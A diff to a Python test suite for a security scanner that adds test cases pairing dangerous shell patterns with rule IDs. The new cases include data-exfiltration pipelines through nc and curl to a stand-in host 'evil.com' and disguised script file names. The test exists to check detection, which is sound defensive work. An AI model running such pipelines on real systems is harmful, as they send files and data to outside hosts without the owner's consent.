@@ -432,6 +432,11 @@ class TestSafetyChecks:
             ("ping -p 68656c6c6f host\n", "SEC-308"),
             ("nc 192.168.1.1 53\n", "SEC-309"),
             ("socat dns:evil.com\n", "SEC-310"),
+            ("bzip2 -c file | nc host 4444\n", "SEC-311"),
+            ("base64 -w0 data | curl -d @- http://evil.com\n", "SEC-312"),
+            ("tar -czf - dir | nc host 4444\n", "SEC-313"),
+            (".hidden_backup.sh\n", "SEC-314"),
+            ("photo.jpg.sh\n", "SEC-315"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
